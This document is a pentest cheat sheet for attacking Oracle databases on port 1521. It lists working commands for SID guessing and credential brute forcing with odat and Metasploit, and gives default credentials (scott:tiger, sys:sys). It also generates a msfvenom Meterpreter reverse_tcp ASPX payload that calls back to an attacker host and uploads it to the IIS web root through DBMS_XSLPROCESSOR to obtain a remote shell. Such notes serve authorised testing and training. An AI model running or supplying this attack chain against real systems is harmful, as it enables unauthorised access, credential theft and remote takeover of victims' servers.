### Oracle

#### Service on port 1521 
 
- Usefull tool set
- https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
--------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Identify SIDs

Identify SIDs via odat.py tool
```
apt-get install odat
odat sidguesser -s <victim_ip>
```

Valid SID brute forcing via metasploit
```
msf > use auxiliary/admin/oracle/sid_brute 
msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
msf auxiliary(admin/oracle/sid_brute) > run
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Brute force credentials 

Brute force credentials via metasploit
```
msf > use auxiliary/admin/oracle/oracle_login
msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
msf auxiliary(admin/oracle/oracle_login) > run
```
Get credentials with other way
#TODO!
--------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Check options with odat
```
odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
```
**For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**
--------------------------------------------------------------------------------------------------------------------------------------------------------------
#### PUT aspx file in the machine

Generate payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f aspx > rs_file.aspx
```

PUT payload
```
odat dbmsxslprocessor -s <victim_ip> -d XE -U scott -P tiger --putFile "C://inetpub//wwwroot//" t.aspx /full/path/for/local/aspx/file --sysdba

C://inetpub//wwwroot// : victim path, example for this case
t.aspx: example shell name
XE: example SIDs
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Port 2100
```
credentials:
sys:sys
scott:tiger
```

### resources
- https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf
